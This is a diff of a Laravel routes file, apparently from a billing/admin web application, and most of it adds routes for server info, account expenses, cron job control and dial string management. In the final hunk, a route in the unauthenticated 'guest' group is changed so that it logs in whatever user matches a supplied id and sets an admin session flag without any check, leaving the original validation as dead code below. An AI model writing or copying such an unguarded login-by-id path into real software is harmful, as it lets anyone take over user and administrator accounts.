@@ -94,6 +94,9 @@ Route::group(array('before' => 'auth'), function () {
     Route::any('customer/payments/ajax_datagrid_total', 'PaymentsCustomerController@ajax_datagrid_total');
 
 
+	//serverinfo
+	Route::any('serverinfo', 'ServerController@index');	
+
     //Account Statement
 
     Route::any('customer/account_statement', 'AccountStatementCustomerController@index');
@@ -247,6 +250,9 @@ Route::group(array('before' => 'auth'), function () {
 	Route::any('/accounts/bulk_tags', 'AccountsController@bulk_tags');
 	Route::any('accounts/authenticate/{id}', 'AuthenticationController@authenticate');
 	Route::any('accounts/authenticate_store', 'AuthenticationController@authenticate_store');
+	Route::any('accounts/activity/{id}', 'AccountsController@expense');
+	Route::any('accounts/expense_chart', 'AccountsController@expense_chart');
+	Route::any('accounts/expense_top_destination/{id}', 'AccountsController@expense_top_destination');
 
 	//Account Subscription
 	Route::any('accounts/{id}/subscription/ajax_datagrid', 'AccountSubscriptionController@ajax_datagrid');
@@ -445,7 +451,7 @@ Route::group(array('before' => 'auth'), function () {
 	Route::any('/jobs/reset', 'JobsController@resetJobsAlert');
 	Route::any('/jobs/{id}/jobRead', 'JobsController@jobRead');
 	Route::any('/jobs/{id}/downloaoutputfile', 'JobsController@downloaOutputFile');
-    Route::any('/activejob', 'JobsController@activejob');
+    Route::any('/activejob', 'JobsController@activejob');// remove in future
     Route::any('/jobs/jobactive_ajax_datagrid', 'JobsController@jobactive_ajax_datagrid');
     Route::any('/jobs/activeprocessdelete/', 'JobsController@activeprocessdelete');
 	Route::resource('jobs', 'JobsController');
@@ -556,6 +562,12 @@ Route::group(array('before' => 'auth'), function () {
     Route::any('/activecronjob', 'CronJobController@activecronjob');
     Route::any('/cronjobs/activecronjob_ajax_datagrid', 'CronJobController@activecronjob_ajax_datagrid');
     Route::any('/cronjobs/activeprocessdelete/', 'CronJobController@activeprocessdelete');
+
+
+	Route::any('/cronjob_monitor', 'CronJobController@cronjob_monitor');
+	Route::any('/cronjob/{id}/start', 'CronJobController@trigger');
+	Route::any('/cronjob/{id}/terminate', 'CronJobController@terminate');
+	Route::any('/cronjob/{id}/status/{id2}', 'CronJobController@change_status');
 
 	//Company
 	Route::any('/company', 'CompaniesController@edit');
@@ -886,6 +898,26 @@ Route::group(array('before' => 'auth'), function () {
 	Route::any('/disputes/{id}/download_attachment','DisputeController@download_attachment');
 	Route::any('/disputes/{id}/view','DisputeController@view');
 
+	//DailString
+	Route::any('/dialstrings', "DialStringController@index");
+	Route::any('/dialstrings/dialstring_datagrid', "DialStringController@dialstring_datagrid");
+	Route::any('/dialstrings/exports/{type}', "DialStringController@exports");
+	Route::any('/dialstrings/create_dialstring', "DialStringController@create_dialstring");
+	Route::any('/dialstrings/update_dialstring/{id}', "DialStringController@update_dialstring");
+	Route::any('/dialstrings/{id}/delete_dialstring', "DialStringController@delete_dialstring");
+
+	Route::any('/dialstrings/dialstringcode/{id}', "DialStringController@dialstringcode");
+	Route::any('/dialstrings/ajax_datagrid/{type}', "DialStringController@ajax_datagrid");
+	Route::any('/dialstrings/store', "DialStringController@store");
+	Route::any('/dialstrings/update/{id}', "DialStringController@update");
+	Route::any('/dialstrings/{id}/deletecode', "DialStringController@deletecode");
+	Route::any('/dialstrings/update_selected', "DialStringController@update_selected");
+	Route::any('/dialstrings/delete_selected', "DialStringController@delete_selected");
+	Route::any('/dialstrings/{id}/upload', "DialStringController@upload");
+	Route::any('/dialstrings/{id}/check_upload', "DialStringController@check_upload");
+	Route::any('/dialstrings/{id}/ajaxfilegrid', 'DialStringController@ajaxfilegrid');
+	Route::any('/dialstrings/{id}/storeTemplate', 'DialStringController@storeTemplate');
+	Route::any('/dialstrings/download_sample_excel_file', "DialStringController@download_sample_excel_file");
 
 });
 
@@ -928,7 +960,15 @@ Route::group(array('before' => 'guest'), function () {
         $user = User::find($id);
         $redirect_to = URL::to('/process_redirect');
 
-        if(!empty($user) ){
+		create_site_configration_cache();
+		Auth::login($user);
+		NeonAPI::login_by_id($id);
+		User::setUserPermission();
+		Session::set("admin", 1);
+		return Redirect::to($redirect_to);
+
+
+			if(!empty($user) ){
             create_site_configration_cache();
             Auth::login($user);
             if(NeonAPI::login_by_id($id)) {
